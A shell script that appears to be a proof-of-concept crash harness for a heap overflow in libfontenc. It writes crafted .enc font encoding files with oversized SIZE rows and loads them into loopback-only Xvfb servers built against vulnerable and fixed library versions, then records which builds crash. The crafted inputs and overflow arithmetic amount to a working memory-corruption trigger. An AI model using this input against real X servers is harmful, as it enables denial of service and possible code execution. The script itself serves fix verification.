#!/bin/sh
# libfontenc2shell: plain (uninstrumented) Xvfb crash matrix.
# No ASan runtime or preload: the pinned library is loaded into a live
# loopback-only X server, a client opens a Type1 font whose XLFD registry is
# crafted-1, and the SUCCESS/FAIL is read from both the client and xdpyinfo.
# SIZE 256 258 writes 508 bytes past the 131072-byte buffer into glibc usable
# slack and survives; SIZE 256 1024 writes far past the mapping and faults.
# Fixed (5920c6e) and 1.1.10 must both survive; 1.1.9 must crash.
set -eu
HERE=$(CDPATH= cd -- "$(dirname -- "$0")" && pwd)
BASE=$(CDPATH= cd -- "$HERE/../.." && pwd)
OUT="$HERE/logs"
FONTS="$HERE/type1fonts"
XLFD='-urw-nimbus mono ps-regular-r-normal--0-0-0-0-p-0-crafted-1'
mkdir -p "$OUT" "$FONTS"

run_case() { # variant case row display [from]
    variant=$1; casename=$2; row=$3; disp=$4; from=${5:-0xff00}
    logpfx="$OUT/plain-$variant-$casename"
    rm -f "$logpfx".*
    printf 'STARTENCODING crafted-1\nSIZE 256 %s\nSTARTMAPPING unicode\n%s 0x5a5a\nENDMAPPING\nENDENCODING\n' \
        "$row" "$from" > "$FONTS/crafted-1.enc"
    LD_PRELOAD="$BASE/build-$variant/out-plain/libfontenc.so.1.0.0" \
    Xvfb ":$disp" -screen 0 640x480x24 -nolisten tcp -noreset -fp "$FONTS" \
        > "$logpfx.out" 2>&1 &
    pid=$!
    sleep 3
    client=0
    DISPLAY=":$disp" "$HERE/xfon-load" ":$disp" "$XLFD" \
        > "$OUT/plain-client-$variant-$casename.out" 2>&1 || client=$?
    dpy=0
    DISPLAY=":$disp" xdpyinfo > "$OUT/plain-xdpy-$variant-$casename.out" 2>&1 || dpy=$?
    alive=NO
    kill -0 "$pid" 2>/dev/null && alive=YES
    kill "$pid" 2>/dev/null || true
    wait "$pid" 2>/dev/null || true
    crash=$(grep -m1 -E 'Caught signal 11|Fatal server error' "$logpfx.out" || true)
    printf '%s %s row=%s index=%s client_rc=%s xdpyinfo_rc=%s server_alive=%s %s\n' \
        "$variant" "$casename" "$row" "$((255 * row))" "$client" "$dpy" "$alive" "$crash"
}

echo "# libfontenc2shell plain-build Xvfb matrix, $(date -u +%FT%TZ)"
echo "# loopback-only Xvfb; no ASan; font path $FONTS; client XLFD registry crafted-1"
echo "# inputs: SIZE 256 ROW / mapping 0xff00 0x5a5a (safe case uses 0x00ff)"
run_case vuln safe 256 120 0x00ff
run_case vuln near 258 121
run_case vuln far512 512 122
run_case vuln far1024-a 1024 123
run_case vuln far1024-b 1024 124
run_case vuln far1024-c 1024 125
run_case fixed far1024 1024 126
run_case 1.1.9 far1024 1024 127
run_case 1.1.10 far1024 1024 128
